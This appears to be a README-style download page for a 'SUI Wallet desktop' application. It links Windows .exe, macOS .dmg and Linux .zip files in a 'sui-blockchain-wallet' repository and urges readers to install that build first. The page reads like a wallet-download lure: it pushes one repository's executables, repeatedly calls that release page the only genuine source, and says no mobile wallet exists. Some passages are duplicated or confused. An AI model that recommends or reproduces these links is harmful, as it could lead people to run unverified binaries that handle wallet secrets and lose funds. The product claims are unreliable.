![SUI Wallet](assets/banner-article.png)

# SUI Wallet desktop download: which build to take

One release ships three files; this is how to take the one built for your machine.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

The [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) carries three files: one `.exe` for Windows, one `.dmg` for macOS and one `.zip` for
Linux x64. Take the one built for the operating system on the machine in front of you, check it against
the digest published beside it, and run it. SUI Wallet is a desktop application; there is no mobile
build to look for.

## The three files and who each is for

One release ships all three platforms, and the filenames say which is which: an installer for Windows, a
disk image for macOS, an archive for Linux. Nothing on the page is a "lite" or "full" variant, and no
file is newer than its neighbours - they come from the same build.

That matters because the commonest download mistake is not picking the wrong operating system. It is
taking a build from somewhere other than the release page: a link in a video description, a mirror, an
advert with a similar name. Those files are the only ones with no digest to check them against.

[How to install SUI Wallet on Windows](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-install-sui-wallet-on-windows.md) takes the Windows path from download to first window.
This page is about the choice that comes before it.

## Architecture, not just the operating system

Each file is built for a 64-bit x86 machine on its platform, and the published requirements say so in one line each. A 32-bit Windows install is outside them, and so is an ARM Linux machine, which is why the file can download and still fail to start.

- **Windows:** Windows 10 (1909) or later, 64-bit.
- **macOS:** macOS 12 or later.
- **Linux:** x64, Ubuntu 20.04 or later, or equivalent.

A 32-bit Windows install is outside that list, and so is an ARM Linux machine. If the machine is older
than the requirement, the file may download and still fail to start, which reads as a broken build
rather than an unsupported one.

The full set of strings, and what each one rules out, is on
[SUI Wallet system requirements](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-system-requirements.md).

## Reading the release page without guessing

Four things on the release page answer almost every question about which file to take and whether it arrived intact: the three assets, one per platform; the size of each; the SHA-256 values published with the release; and the date, which tells you how current the build is.

1. **The three assets.** One per platform, named for the platform.
2. **The size of each.** A file far smaller than its neighbours is an interrupted download, not a new
   kind of build.
3. **The SHA-256 values.** One per asset, published with the release.
4. **The date.** The newest release is the one the guides describe; an older one is how a missing screen
   happens.

Downloading is free and needs no account, so nothing on the page asks for a login before a file is
available. If a page does, it is not the release page.

## Checking the file before you run it

Compare the digest before running anything. Windows produces it with `Get-FileHash`, macOS with `shasum -a 256`, Linux with `sha256sum`; each prints a 64-character string that has to match the published value exactly, character for character, and a near miss is a different file.

A mismatch has two causes and no third: the download was interrupted, or the file did not come from the
release. Either way the answer is the same - delete it and take the file from the release page again.

The check is worth the minute it takes. A wallet is the one application where a modified installer has
something to gain: it runs before any wallet code exists, so nothing inside the app can warn about it
afterwards.

## What the product does not have: a mobile build

SUI Wallet is desktop software. The release carries Windows, macOS and Linux files, and there is no
Android or iOS build on it. A page offering an APK or a "mobile wallet" under this name is either a
different product or not a wallet at all.

That is not a limitation to work around - it is what the product is. A reader who needs a phone wallet
needs a different product, and a reader who wants the desktop wallet has exactly one place to get it:
the release page. Every download page on this project says the same thing, because a second distribution
channel is how fake builds arrive.

## If you downloaded the wrong file

Three cases, three answers, and none of them involves reinstalling anything. The mistakes are almost always the same ones - the wrong operating system's file, an archive taken for an installer, or a download from somewhere that is not the release page - so the fix is quick once you know which you have.

- **An installer on a Mac, or a disk image on Windows.** Nothing runs. Delete it and take the file for
  the right platform.
- **A Linux archive on a desktop distribution.** It runs, but the first while goes on permissions
  instead of on the wallet. The archive is meant for that platform and you place it where you like.
- **A file from anywhere but the release page.** Delete it before running it. Then check the phrase if
  the app ever showed one, and move funds to a fresh account if it did.

When in doubt, the release page is the answer to "which file" and the digest is the answer to "is this
the file".

## FAQ

### Is there a portable version for Windows?

The Windows build is an installer. The Linux build is an archive because that is the convention on
Linux, not because a portable Windows build exists.

### The release page lists three files. Do I need all three?

No. One machine needs one file. The other two belong to the other platforms and are there so the same
release serves everyone.

### Why is the Linux file so much smaller?

Archive sizes differ from installer sizes because the packaging differs, not because content is missing.
Compare sizes only within one platform across releases, never across platforms.

### Can I install the macOS build on Windows with a virtual machine?

A virtual machine running macOS is a macOS machine as far as the app is concerned, and the published
requirement still applies. The same is true in reverse: Windows inside a virtual machine takes the
Windows installer.

### Where do I check that the file is current?

The changelog lists one line per release, newest first.
[Updating SUI Wallet to the latest release](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/updating-sui-wallet-to-the-latest-release.md) covers how to tell which build is installed and
how to move to the current one.
